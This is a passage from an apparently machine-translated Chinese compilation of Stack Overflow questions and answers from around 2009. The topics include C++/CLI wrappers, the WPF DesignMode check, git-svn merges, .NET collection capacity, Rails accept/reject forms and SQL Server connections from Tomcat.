    <Row><Cell value="valueConvertedToString"/><Cell null="true"/></Row>
    ....
  </Data>
</ResultSet> 
```

或特定于元数据：

```
<ResultSet>
  <MetaData>
    <Column name="id" type="int"/>
    <Column name="color" type="string"/>
    ....
  <MetaData>
  <Data>
    <Row><id value="45"/><color null="true"/></Row>
    ....
  </Data>
</ResultSet> 
```

在第二种情况下，您不能静态定义模式。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-11T02:18:54.940

我同意第一位受访者的观点，即您只需编写一些代码即可获得非常好的人机+计算机可读的 XML 表示。

早在 2002 年，我就采用了同样的方法来创建 XML/PDF/HTML/XHTML/XLS 报告工具的中间件业务对象。只需几个小时就可以将业务对象编程为 XML 转换器。我利用了对象不是自引用的事实。否则，我将不得不添加引用元素，而不仅仅是将值展平。

如果您使用 Java 5 或更高版本，还有[WebRowSet技术。](http://java.sun.com/j2se/1.5.0/docs/api/javax/sql/rowset/WebRowSet.html)我不能说它的输出看起来非常适合 XSLT 直接使用，但它仍然可用。比典型的 JAXB 输出更可口。

但是，如果您运行的是 Java 6 或更高版本，现在有一种更酷的方法。

如果您使用的是 JDBC 4，您可以指定一个带有通用类型参数的 Dataset 来标识该类，并且 JDBC 将使用该数据填充该类的字段。这是技巧的前半部分。有关更多详细信息，请参阅[JDBC 注释](http://www.java2s.com/Code/Java/JDK-6/JDBCAnnotations.htm)

技巧的后半部分是使用 XStream 将这些集合转换为 XML。XStream 通常在第一次就给出一个好的结果。

[您可以通过为 XStream 提供一些别名](http://xstream.codehaus.org/alias-tutorial.html)来使生成的 XML 真正干净、可读、简洁（即“紧凑”）。如果这不起作用，还有很多其他方法可以[调整输出](http://xstream.codehaus.org/manual-tweaking-output.html)。

# .net - 旧版 C++ 库的托管 C++ 包装器

> ID：425752
> 
> 赞同：6
> 
> 时间：2009-01-08T20:23:21.873
> 
> 标签：.net, c++, managed-c++

我们正在考虑为一些使用托管 C++ 的遗留 C++ 库编写一个 .Net 可调用包装器。

这一切看起来都很容易。我们有什么需要注意的吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-01-08T21:00:05.357

我发现在 C++/CLI 中包装一些现有的 C++ 库通常很容易，并且遇到的陷阱相对较少。我记得的有：

*   在同一个可执行文件/DLL 中混合非托管 C++ 代码和 C++/CLI 代码是一个非常糟糕的主意。我在关机时遇到了竞争内存管理器的问题（基本上是 .NET 运行时和常规 C++ 运行时，在关机时清理内存时相互踩踏，导致不确定的行为哪个释放了什么）。我没有将静态遗留 C++ 库链接到 C++/CLI 库，而是创建了一个包含遗留 C++ 的 DLL，并将其与 C++/CLI DLL 链接，从而一劳永逸地解决了这个问题。
*   如果您的代码使用枚举，则必须将它们包装在适当的 C++/CLI 枚举类中，否则其他 .NET 语言将无法查看和使用它们。
*   C++/CLI 对象只能保存指向非托管 C++ 对象的指针。不幸的是，在某些情况下，这意味着您必须创建薄包装层来处理某些对象。我的“最喜欢的”是我必须以这种方式包装 boost::shared_ptrs（从而添加另一层间接），或者在跨越 .NET/native 边界后将它们放入带有空删除器的 shared_ptrs 中。当您必须处理大量使用这种构造的 API 时，两者都不是很好。RAII 不会跨越这个界限，所以请注意，您将不得不投入一些时间来调整它以匹配 .NET 方式。
*   C++/CLI 不进行多重继承，因此如果您的遗留库正在使用它，您可能必须使用接口等对其进行建模。
*   内部编组代码似乎能够处理大多数 POD 转换，但您将拥有转换 std::strings 等的查找/借用代码。这段代码已经存在，在 Google 上几分钟应该会显示出来（对不起，不要'目前这里没有任何方便的链接）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-08T20:51:15.280

它非常简单并且运行良好。它比 PInvoke 容易得多。

您需要注意的一件大事是在您的托管标头中没有任何非托管成员，包括私有成员、方法签名等。虽然私有成员是指向托管类型的指针是可以的，只需使用前向声明为您的类。

另外，请注意对象的生命周期。很容易引入内存泄漏，因为许多 .NET 程序员不习惯自己清理。如果您创建的任何包装类包含指针，请确保它们是一次性的，并确保您在托管代码中处置它们。托管 C++ 中 IDisposable 的语法也很奇怪，但它在文档中。

另外，请记住，每次跨越托管/非托管边界时都会受到轻微影响，因此请尝试相应地规划您的界面。如果任何东西在循环中被重复调用，最好将该循环移动到边界上，这样你只穿过一次。除非您正在谈论数百万个电话，否则请不要太担心这一点。

这篇文章是相反的，但它有一些有用的观点。

[使用我们的 ManWrap 库在本机 C++ 代码中充分利用 .NET](http://msdn.microsoft.com/en-ca/magazine/cc300632.aspx)

也可以看看

[Visual Studio 2005 中的托管代码](http://msdn.microsoft.com/en-us/magazine/cc163602.aspx)和
[删除托管对象、包装库等](http://msdn.microsoft.com/en-us/magazine/cc300523.aspx)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-08T21:00:21.487

只是我们遇到的一些问题：

*   内存/资源生命周期管理（GC/IDisposable 与析构函数）。我认为这是众所周知的，并且 Rob 的帖子有一些关于它的内容，所以我不会在这里详细说明......
*   字符串编码/解码。如果您的本机代码是 UNICODE 构建，则不必担心太多，但如果不是，请在本机字符串和 .Net 字符串之间转换时注意编码。
*   C++ 不支持 [Conditional("Debug")]，这意味着在发布版本中也会调用 Debug.Assert、Debug.Trace 等。请改用传统的 C++ 宏。
*   64 位支持：.Net 默认生成 32 位或 64 位代码，具体取决于平台，但您的本机代码可能只有 32 位...

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-08T22:41:52.063

我将添加到每个人已经说过的内容，

pin_ptr wch = PtrToStringChars（字符串）；（其中字符串是 System::String）

会成为你的朋友。

您不能直接将非托管类包含到托管类中，但您可以将指向非托管类的指针放在构造函数中并将其新建并在析构函数中将其删除。

我没有遇到 Timo Geusch 提到的在一个 DLL 中混合 C++ 和 C++/CLI 代码的问题。我的 DLL 广泛使用这两种方法都没有问题。

C++/CLI 并不难（如果您了解 C++ 和 .NET）并且效果很好。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2010-02-09T22:06:13.473

正如其他人所说：98％的时间它只是工作，可调试且快速。

到目前为止，我遇到的超出了提到的范围：

*   不要将所有遗留的 c++ 代码编译为托管的。有一些文章暗示这会很有用，但通常只是速度较慢。
*   不要忘记捕获非托管异常并将它们作为托管异常重新抛出。
*   如果您使用 MFC，请注意您不能使用 .lib 运行时，因此您也将部署 MFC 运行时。
*   OpenMP（一个线程库）不会在 C++/CLI 中运行。
*   当我们使 C++/CLI dll 依赖于我们自己的代码中的 C# dll 时，我们在 VS2005 中遇到了一些构建问题。

它甚至工作得非常好，以至于我开始编写 C++/CLI 代码来对 C++ 代码运行单元测试。NUnit/Resharper 很乐意在 C++/CLI DLL 中找到并运行单元测试，它可以在任何级别直接调用您的本机代码，甚至可以测试您的模板容器类。

# .net - 多线程单元测试

> ID：425756
> 
> 赞同：1
> 
> 时间：2009-01-08T20:25:07.033
> 
> 标签：.net, visual-studio-2008, multithreading, unit-testing

为了测试并发问题，我想使用单元测试在两个不同的线程上同时调用相同的方法。事实上，我可能想同时在多个线程上调用相同的方法。

我正在使用微软为 VS2008 内置的单元测试器。

我的想法是我会锁定一个对象，然后同步设置每个线程，这些线程将立即等待锁，然后释放锁，这将允许所有线程访问共享资源并测试代码正确处理多个的能力线程。

以前有人做过吗？我在这里采取合理的方法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-01-08T20:33:48.233

我以前做过这个，即使结果并不总是可重现的，但它们可以突出代码中的问题或错误。

不过，我不使用微软的单元测试，我更喜欢[MbUnit](http://www.mbunit.com/)，它具有 ThreadedRepeat 属性，允许您指定要运行的线程数。它使整个多线程测试变得更加容易，只需编写一个测试并添加一个属性。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-08T20:28:07.013

这种方法的问题是结果不可重现。因此，如果您的代码中存在错误，则多次调用相同的测试会在某些情况下（例如）导致死锁，而在其他情况下则不会。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-08T21:36:15.767

如果您使用单元测试来测试多线程代码，那么您可能做错了。

对于初学者，您无法保证这两种方法会同时运行。这意味着您的测试不能保证您的代码有效。

您可能可以通过插入睡眠命令来测试您的方法在多线程环境中是否正常工作，但这对于单元测试来说太麻烦了；它实际上是一个概念证明，而不是在我确定某些部分代码按预期工作之后我会留下作为单元测试的东西。

多线程测试本身很好，可以在单元测试花费大量时间时加快单元测试，但单元测试对于测试小型隔离方法至关重要。

您可能会考虑压力测试，但这是“从外部”完成的，而不是像单元测试那样“从内部”完成的。这意味着您在服务器上编写一个客户端，并从多台机器上运行数千次，测试整个系统而不是单一的隔离方法。压力测试有两个主要优点。首先，压力测试用于准确找出在实时情况下百次运行中发生一次的缺陷类型，其次，由于它们是“从外部”完成的，它们可以更好地重现线程穿过你的方式的方式应用。

在我看来，单元测试对于测试多线程代码与通过调试器运行代码一样糟糕——当一个线程等待您启动下一步时，其他线程将超时，您将永远无法获得真实的重现.

总而言之，并非所有东西都应该进行单元测试。概念验证测试是确保您的线程安全集合确实是线程安全的好方法，并且压力测试非常适合发现多线程代码中的错误。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-08T20:34:24.503

对于单元测试，我认为这是次优的，因为 Kibbee 表示它可能会或可能不会成功。您需要运行数百或数千次，即使存在竞争条件，您也可能永远不会遇到错误。

如果您试图确保没有死锁，您可以查看 typemock racer：[http](http://www.typemock.com/learn_about_typemock_racer.html) ://www.typemock.com/learn_about_typemock_racer.html我对它的经验为零，但听起来它可以检测到很多死锁。

# netbeans - Netbeans J2ME SVG 合规性

> ID：425757
> 
> 赞同：0
> 
> 时间：2009-01-08T20:25:16.207
> 
> 标签：netbeans, svg, java-me, standards-compliance

我为我正在处理的项目编写了一些 svg 图像。但是当我尝试将它们放在 netbeans 软件（j2me）中的屏幕（表单）上时，它会说“图像不符合 SVG Tiny”。我什至尝试使用 Sun 的 WTK 演示的**THAT WORK**部署时的 svg 图像进行测试，但它说的是同样的事情。关于出了什么问题的任何想法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-09T19:30:16.357

**好吧，您必须意识到SVG**和**SVG Tiny**之间存在差异，[维基百科](http://en.wikipedia.org/wiki/SVG_Tiny)对此进行了解释。

# .net - 指定集合的 初始容量是最佳实践吗？

> ID：425759
> 
> 赞同：1
> 
> 时间：2009-01-08T20:26:06.267
> 
> 标签：.net, collections

.Net 中的许多集合类（即 List<T>、Dictionary<TKey、TValue>）都有一个重载的构造函数，可让您指定初始容量大小。使用此构造函数是最佳实践吗？如果是这样，它们是否有关于您应该使用某种“幻数”的规则？如果我提前知道确切的尺寸是一回事，但如果我不知道怎么办？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-08T20:30:29.893

> 使用此构造函数是最佳实践吗？

确实。在处理大量数据时，这可能会使应用程序更加高效，因为它可以有效地防止在连续填充容器时重复分配和复制大数据批次。

举一个使用`List`数据结构的例子：

在这两种情况下，插入实际上具有相同的摊销常量运行时间。这意味着无论容器大小如何，`Add`操作都将花费恒定的时间。然而，这只是平均水平。如果容器必须在内部调整大小，否则会溢出，这一`Add`操作实际上需要 O( *n* )，即它的时间与容器的大小成正比。

在添加许多元素的过程中，这并不重要，但是对于较大的*n*，如果 UI 在此期间冻结，用户可以感知到*单个*插入操作。

如果您从一开始就已经预留了足够大的容量，这将*永远不会发生。*

> 如果是这样，它们是否有关于您应该使用某种“幻数”的规则？

不，如果您*知道*（甚至是近似的）尺寸，请使用它。如果你不这样做，请不要打扰。这些容器的自动放大策略*实际上*非常好，并且在大多数情况下猜测会变得更糟糕（除非你有一个明智的猜测，但它根本不是真正的猜测，是吗？）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-08T20:30:42.733

由于`List<T>`对象的大小以 2 的次方增长，因此指定初始大小在性能方面并不重要，除非您知道集合会变得非常大。在这种情况下，将集合初始化为较大的大小以避免多次调整大小可能是有意义的。

通常，如果我在创建集合之前确切知道集合的大小，我只需创建一个数组并将其作为`IEnumerable<T>`

# wpf - WPF 中是否有 DesignMode 属性？

> ID：425760
> 
> 赞同：105
> 
> 时间：2009-01-08T20:26:18.560
> 
> 标签：wpf, .net-3.5

在 Winforms 你可以说

```
if ( DesignMode )
{
  // Do something that only happens on Design mode
} 
```

WPF中有这样的东西吗？

* * *

## 回答 #1

> 赞同：160
> 
> 时间：2009-01-08T21:35:11.587

**确实有**：

**[System.ComponentModel.DesignerProperties.GetIsInDesignMode](http://msdn.microsoft.com/en-us/library/system.componentmodel.designerproperties.getisindesignmode.aspx)**

例子：

```
using System.ComponentModel;
using System.Windows;
using System.Windows.Controls;

public class MyUserControl : UserControl
{
    public MyUserControl()
    {
        if (DesignerProperties.GetIsInDesignMode(this))
        {
            // Design-mode specific functionality
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：48
> 
> 时间：2010-01-04T17:06:35.943

在某些情况下，我需要知道对我的非 UI 类的调用是否由设计器发起（例如，如果我从 XAML 创建 DataContext 类）。那么[这篇 MSDN 文章](http://msdn.microsoft.com/en-us/library/bb546934.aspx)中的方法很有帮助：

```
// Check for design mode. 
if ((bool)(DesignerProperties.IsInDesignModeProperty.GetMetadata(typeof(DependencyObject)).DefaultValue)) 
{
    //in Design mode
} 
```

* * *

## 回答 #3

> 赞同：22
> 
> 时间：2010-11-08T19:50:15.677

**对于在 WinForms 中托管的**任何 WPF 控件，`DesignerProperties.GetIsInDesignMode(this)`都不起作用。

因此，我[在 Microsoft Connect 中创建了一个错误](https://connect.microsoft.com/VisualStudio/feedback/details/620001/system-componentmodel-designerproperties-getisindesignmode-does-not-work-if-the-wpf-is-hosted-on-a-winform#tabs)并添加了解决方法：

```
public static bool IsInDesignMode()
{
    if ( System.Reflection.Assembly.GetExecutingAssembly().Location.Contains( "VisualStudio" ) )
    {
        return true;
    }
    return false;
} 
```

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2016-09-30T14:34:21.120

迟到的答案，我知道 - 但对于任何想在 a`DataTrigger`或 XAML 中的任何地方使用它的人来说：

```
xmlns:componentModel="clr-namespace:System.ComponentModel;assembly=PresentationFramework"

<Style.Triggers>
    <DataTrigger Binding="{Binding RelativeSource={RelativeSource Self}, 
                 Path=(componentModel:DesignerProperties.IsInDesignMode)}" 
                 Value="True">
        <Setter Property="Visibility" Value="Visible"/>
    </DataTrigger>
</Style.Triggers> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-04-07T19:04:21.530

使用这个：

```
if (Windows.ApplicationModel.DesignMode.DesignModeEnabled)
{
    //design only code here
} 
```

（异步和文件操作在这里不起作用）

此外，在 XAML 中实例化设计时对象（d 是特殊的设计器命名空间）

```
<Grid d:DataContext="{d:DesignInstance Type=local:MyViewModel, IsDesignTimeCreatable=True}">
...
</Grid> 
```

# vba - 如何在 VBA 中的形状之间复制 Visio shapesheet 部分

> ID：425763
> 
> 赞同：0
> 
> 时间：2009-01-08T20:26:53.100
> 
> 标签：vba, visio, shapesheet

是否有一种方法可用于使用 VBA 将形状中的部分复制到另一个形状？我特别想将所有自定义属性和用户单元格从一个页面复制到另一个页面。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-08T21:45:05.953

不幸的是，没有一种简单的方法可以做到这一点。您必须遍历源工作表中的所有行并在目标工作表中创建相同的行。例如：

```
Dim oPageSheet1 As Visio.Shape
Dim oPageSheet2 As Visio.Shape
Dim rowName     As String
Dim i   As Integer

Set oPageSheet1 = Visio.ActiveDocument.Pages.Item(1).PageSheet
Set oPageSheet2 = Visio.ActiveDocument.Pages.Item(2).PageSheet

i = visRowUser

While oPageSheet1.CellsSRCExists(visSectionUser, i, visUserValue, False)
    oPageSheet2.AddNamedRow visSectionUser, oPageSheet1.Section(visSectionUser).Row(i).NameU, 0
    oPageSheet2.Section(visSectionUser).Row(i).Name = oPageSheet1.Section(visSectionUser).Row(i).Name
    oPageSheet2.CellsSRC(visSectionUser, i, visUserValue).FormulaU = oPageSheet1.CellsSRC(visSectionUser, i, visUserValue).FormulaU
    oPageSheet2.CellsSRC(visSectionUser, i, visUserPrompt).FormulaU = oPageSheet1.CellsSRC(visSectionUser, i, visUserPrompt).FormulaU
    i = i + 1
Wend 
```

如果您必须复制大量行并且性能是一个考虑因素，您应该使用[AddRows](http://msdn.microsoft.com/en-us/library/aa175231(office.11).aspx)和[SetFormulas](http://msdn.microsoft.com/en-us/library/aa175375(office.11).aspx)进行调查。

# git - 为什么 git svn dcommit 会丢失本地分支的合并提交历史？

> ID：425766
> 
> 赞同：18
> 
> 时间：2009-01-08T20:27:27.763
> 
> 标签：git, git-svn, rebase

我有一个使用`git svn clone`. 我创建了一个本地分支，进行了一些更改，然后切换回 master，`git svn rebase`如果一切顺利，我将分支合并回 master。然后树看起来像这样：

[替代文字 http://img.skitch.com/20090108-cjguu3hcci9x2k17mcftamw8f1.jpg](http://img.skitch.com/20090108-cjguu3hcci9x2k17mcftamw8f1.jpg)

有时，稍后当我`git svn rebase`再次进行一些远程更改时，它会丢失 a_branch 已合并到主线中的事实，并且树看起来像这样：

[替代文字 http://img.skitch.com/20090108-kn3bn1qgi5ijw8ja5ijkd75pa3.jpg](http://img.skitch.com/20090108-kn3bn1qgi5ijw8ja5ijkd75pa3.jpg)

这是为什么？我能阻止它吗？有没有一种简单的方法可以告诉分支已合并，或者我应该在完成后删除我的分支，这样我就不会忘记已合并和未合并的内容？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2009-01-08T22:19:58.050

git-svn 手册页建议您不要使用合并。这是一个副作用。由于您正在重新设置分支（git svn rebase 有点像“git pull --rebase”），它有效地重写了历史记录。它可能会丢弃任何已经在 subversion 上游的本地提交，例如合并，并只保留那些真正存在于 svn 存储库中的提交。由于本地分支的简单合并提交在 SVN 中没有等效项，因此您只提交“真正的”更改，因此这些是在新的 rebase 主分支中看到的唯一更改。

理想情况下，您的本地分支应该只合并快进，即不生成合并提交。如果不是这种情况，那么您应该考虑将本地分支重新定位到 master 而不是合并它。这避免了完全创建合并提交。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-08T20:39:03.277

因为你正在通过svn。当你这样做时，你会丢失很多信息（例如，你也会丢失作者）。

# xaml - 在运行时设置 XAML？

> ID：425767
> 
> 赞同：3
> 
> 时间：2009-01-08T20:27:28.887
> 
> 标签：xaml

我可以动态创建 XAML 并将其弹出到我的应用程序中吗？怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-08T20:32:59.607

是的，这很简单：

```
XmlReader tXml = XmlReader.Create(myXamlString);
UIElement MyElement = (UIElement)XamlReader.Load(tXml); 
```

然后你可以用它做你喜欢的事情。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-08T20:33:51.057

关于动态 XAML 生成的几篇文章：

*   [用于显示 XML 的动态 XAML](http://blogs.msdn.com/calvin_hsia/archive/2007/12/06/6684376.aspx)
*   [具有表示模型模式的动态 XAML](http://www.devx.com/dotnet/Article/35135)

# asp.net - 餐厅后端系统和.Net

> ID：425786
> 
> 赞同：4
> 
> 时间：2009-01-08T20:31:53.587
> 
> 标签：asp.net, api, e-commerce

我如何使用 Micros POS 以编程方式连接到餐厅的现有后端系统，以及使用 .Net 和 C# 构建的 Web 应用程序。谢谢。

更新：抱歉，含糊不清，但我想建立一个在线订购系统，接收用户的订单并转发到餐厅的后端系统，以便在厨房处理和打印供厨师查看。

选择 .Net 并没有什么特别的原因，除了我最熟悉它。我对其他选择持开放态度。

一般来说，我正在寻找有关此可行性以及如何以编程方式进行的信息。我的应用程序如何将订单发送到厨房的打印机？餐厅后端系统是否允许 .Net（或任何其他）应用程序与其通信？他们提供 API 吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-08T22:52:09.700

我目前在一家 ISV 工作，该 ISV 基本上与另一个三大销售点系统中的一个一起完成这项工作。

首先，在 VM 中建立 Micros 环境。

其次，这些后台系统中的大多数都运行 Windows 2000 或 Windows XP（取决于系统的年龄），所以要非常小心您选择的 .Net 版本。

现在，就架构而言，在后台运行一项服务，该服务定期与集中式 Web 服务（客户订购的网站）通信，一旦订单可用，您就可以从那里将其插入 <insert pos在此处输入>。

您还会发现，在大多数情况下，尤其是 Micros 是餐厅市场上最大的销售点，它们在文档方面并没有帮助您集成到他们的软件中。

另外，我认为 My Micros（他们的企业应用程序）已经支持这种类型的功能。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-08T22:55:35.200

另一种意见，今年进入[FSTech](http://www.fstec.com/home.aspx)并浏览所有比赛，有大量的在线订购，以便您熟悉比赛功能集。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-08T20:51:41.643

你需要知道的是在选择技术之前定义你想用 POS 做什么，如果你想做的只是显示来自 POS 系统工作的一些数据/报告，你需要连接到任何后端数据库POS 设备馈入。

如果您需要做其他事情，则需要查找任何相关文档。

提出更具体的问题会更有帮助。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-08T22:43:49.937

我可能会首先确定 Micros POS 是否有 API。如果有，个别餐厅的系统是否连接到网络？尝试在使用这些系统之一的地方与经理聊天，或者只是查看他们网站上的文档。

# java - 是否有工具可以可视化实时 Spring 应用程序上下文？

> ID：425794
> 
> 赞同：22
> 
> 时间：2009-01-08T20:33:50.823
> 
> 标签：java, spring, spring-ide

是否有任何工具可以采用完全构建/连接的 Spring 应用程序上下文并导出它的可视化？我说的是一个实时上下文，它显示了应用方面的顺序、哪些 bean 自动连接到其他 bean 等。

我知道它可以用上下文文件本身来完成（re：Spring IDE）。然而，我相信新的注释驱动范式打败了这种方法。

首选 Eclipse 插件或命令行解决方案，但我也有兴趣看看是否存在类似的东西。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2011-11-08T11:02:12.757

我编写了一个 ApplicationContextDumper 来将实时 Spring 应用程序上下文转储到日志中。它显示了自动装配的 bean 和组件扫描加载的 bean，但无法显示应用了哪个方面。

[https://gist.github.com/aleung/1347171](https://gist.github.com/aleung/1347171)中的源代码和示例

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-27T08:09:45.683

我正在寻找相同的工具。不幸的是，除了等待 Spring 3.2 之外，我没有看到任何其他可能性。见[https://jira.springsource.org/browse/SPR-9662](https://jira.springsource.org/browse/SPR-9662)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-05-26T22:32:56.017

[作为banterCZ 回答](https://stackoverflow.com/a/12138340/415801)的后续，Spring Tool Suite 3.2.0 中的 Live Beans Graph 现在几乎完全符合您的要求，尽管没有导出功能。

请参阅 STS v3.2.0[新的和值得注意的页面](http://docs.spring.io/sts/nan/v320/NewAndNoteworthy.html)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-08T21:33:07.193

你在寻找类似[bean graph](http://springide.org/project/wiki/BeansGraph)的东西吗？它是 spring ide 的一部分，可以在项目级别生成。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-07T22:33:13.283

或许您可以通过 JXInsight [http://www.jinspired.com/products/jxinsight/](http://www.jinspired.com/products/jxinsight/)找到一些东西， 它们似乎有一个 Spring 扩展，它们可能可以显示对象图可视化。

# workflow - Windows 工作流 - IfElse 分支

> ID：425803
> 
> 赞同：2
> 
> 时间：2009-01-08T20:37:37.507
> 
> 标签：workflow, workflow-foundation

我正在尝试使用 Windows Workflow 并拥有一个与以下链接中的图像相似的模型：
![工作流屏幕截图](https://i.stack.imgur.com/NK4tR.jpg)

在每个发送活动 ( `GetSomthing`, `GetSomthingElse`, `GetSomeMoreStuff`) 之后调用相同的自定义活动 ( `LogSomthingBadHappened`)。

虽然在我的真实模型中的这张图片中它可能看起来并不那么糟糕，但自定义活动是一个 SequenceActivty，有很多节点，当它重复 3 次时开始使工作流看起来很丑陋。

我想做这样的事情：
![编辑的工作流屏幕截图](https://i.stack.imgur.com/ZSoYU.jpg)

分支可以`IfElse`这样合并吗？
我应该改用状态机工作流程吗（还没有弄清楚这些）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-08T21:48:45.367

在工作流上使用 FaultHandler 并引发处理程序将捕获的特定异常类型。不是最优雅的，但我认为它应该工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-08T22:18:25.480

在顺序工作流中，所有步骤都必须以特定顺序出现，并且执行路径由控制结构（IF、WHILE）专门调节。
以您描述的方式更改执行路径就像在命令式代码中使用 GOTO 语句一样，我们知道这会导致不必要的复杂性。

如果您需要在工作流的不同阶段执行的**SequenceActivity中包含的活动完全相同，您可以将它们嵌入到****自定义活动**中。这种方式更容易管理它们，因为它们包含在单个逻辑单元中。
在命令式代码中，这就像将一部分重复代码重构为一个方法，然后在多个地方调用该方法。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-08T23:03:17.557

另一种可能可行的方法是将您的**LogSomthingBadHappened**活动放入自定义工作流程中并多次包含该活动。需要注意的几点： 子工作流是[异步](http://msdn.microsoft.com/en-us/library/system.workflow.activities.invokeworkflowactivity.aspx)执行的，如果 LogSomthingBadHappened 活动需要来自主工作流的状态信息，将其复制到子工作流可能会很困难。

我没有尝试过这个，所以它甚至可能不起作用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-28T09:19:47.697

我认为 gbanfill 的答案指向了正确的方向。

概括地说，我将问题定义为：

有没有办法定义一组将在工作流的多个位置执行的活动？
进一步的要求是：

1.  活动组应仅在 XAML 中定义，即没有代码。
2.  当然，该组的输入类型是固定的，但实际值应取决于调用（如调用函数）。

也许这样做的方法是定义子工作流并构建一个自定义活动，该活动将实例化子工作流并等待它完成后再继续。

此自定义活动应至少具有两个参数：子工作流 id 和输入参数。

# ruby-on-rails - Rails 视图上的多个链接，每个链接执行不同的操作 - 如何最好地处理这个？

> ID：425805
> 
> 赞同：1
> 
> 时间：2009-01-08T20:37:46.383
> 
> 标签：ruby-on-rails

我正在做的一件事包括**显示**视图上的几个链接。例如，我有一个用于“接受”的链接（或按钮），以及另一个用于“拒绝”的链接（或按钮）。点击Accept，模型更新is_accepted字段为true，点击Reject，is_accepted字段为false。

现在，我该如何最好地处理这个问题？在 ASP.NET 中，我会简单地创建一个 LinkBut​​ton 并编写一个处理程序，但 Rails 不能这样工作，所以我试图弄清楚如何从本质上复制 LinkBut​​ton 的功能。

现在，我在同一个视图上编写两个表单，几乎相同，看起来像这样：

```
<%= form_for @thing do |f| %>
  <%= hidden_field_tag 'thing[is_accepted]', '1' %>
  <%= f.submit "Accept" %>
<% end %>
<%= form_for @thing do |f| %>
  <%= hidden_field_tag 'thing[is_accepted]', '0' %>
  <%= f.submit "Reject" %>
<% end %> 
```

这对我来说感觉很奇怪，但我似乎找不到任何说这是错误的方法。

我想，我可以通过使用部分和/或辅助方法来干掉事情，但我想确保我走在正确的轨道上并且没有做完全错误的事情。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-08T21:10:03.603

你可以给你的提交标签一个名字..即

```
<%= form_for @thing do |f| %>
  <%= hidden_field_tag 'thing[is_accepted]' %>
  <%= f.submit "Accept", :name => 'accept' %>
  <%= f.submit "Reject", :name => 'reject' %>
<% end %> 
```

然后您可以检测 params[] 中的名称并跳过 '1'/'0' 值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-08T22:03:37.397

我认为你的做法是正确的。清理表单的一种方法是一直使用模型表单助手，所以你最终会得到类似的东西

```
<%= form_for @thing do |f| %>
  <%= f.hidden_field :accepted, :value => true %>
  <%= f.submit "Accept" %>
<% end %>

<%= form_for @thing do |f| %>
  <%= f.hidden_field :accepted, :value => false %>
  <%= f.submit "Reject" %>
<% end %> 
```

但除此之外，它看起来是正确的方法。我建议不要创建新方法来执行此操作，因为您没有在正常的 Web 请求之外做任何事情（在这种情况下更新模型）。

使用提交标签作为开关并在 params[] 中检测它也是一个好方法，但我通常更喜欢让我的控制器尽可能地保持原样。最后，这两种方式都会在 UI 中产生相同数量的“东西”，所以无论你喜欢使用哪种风格都应该没问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-08T21:10:01.203

根据您希望 UI 的工作方式，您可能会考虑 link_to_remote（原型助手的一部分） - 您可以指定操作、参数等，并让它返回一些运行的 JS。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2009-01-08T21:15:18.133

如果您在 routes.rb 中使用 map.resources，您应该能够执行以下操作：

```
map.resources :things, :member => {:accept => :get, :reject => :get} 
```

然后在你的控制器中：

```
def accept
  @thing = Thing.find(params[:id])
  @thing.is_accepted = true
  @thing.save
end

def reject
  @thing = Thing.find(params[:id])
  @thing.is_accepted = false
  @thing.save
end 
```

最后在你看来：

```
<%= link_to 'Accept', accept_thing_url(@thing) %>
<%= link_to 'Reject', reject_thing_url(@thing) %> 
```

或者，如果您使用的是 Ajax：

```
<%= link_to_remote 'Accept', :url => accept_thing_url(@thing) %>
<%= link_to_remote 'Reject', :url => reject_thing_url(@thing) %> 
```

# sql-server - Tomcat 6 中的 SQL Server 连接管理

> ID：425809
> 
> 赞同：0
> 
> 时间：2009-01-08T20:38:29.223
> 
> 标签：sql-server, tomcat, jdbc, connection-pooling, jtds

我们在使用 JDBC 连接到 SQL Server 数据库的 Tomcat 6 中运行的 Java Web 应用程序遇到问题。

在几次请求之后，应用程序服务器死掉了，并且在日志文件中我们发现了与数据库连接失败相关的异常。

我们现在没有使用任何连接池，而是使用标准的 JDBC/ODBC/ADO 驱动程序桥连接到 SQL Server。

我们是否应该考虑使用连接池来消除问题？

另外，我们是否应该将驱动程序更改为类似 jTDS 的东西？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-09T16:43:15.883

我肯定会试试 jTDS。我过去在 Tomcat 5.5 中使用过它，没有任何问题。作为调试步骤，这似乎是一个相对快速、影响较小的更改。我想你会发现它更快更稳定。它还具有开源的优势。

